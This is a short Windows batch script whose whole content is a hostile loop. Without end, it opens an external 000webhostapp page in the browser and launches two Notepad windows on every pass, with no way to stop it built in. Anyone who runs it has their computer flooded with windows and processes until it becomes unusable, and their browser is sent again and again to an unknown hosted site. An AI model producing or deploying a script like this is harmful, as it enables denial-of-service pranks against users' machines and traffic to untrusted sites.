@echo off
:loop
start "" /b "https://sanskritic-stopper.000webhostapp.com/"
START %SystemRoot%\system32\notepad.exe
START %SystemRoot%\system32\notepad.exe
ping -n 1 127.0.0.1 > nul
goto loop
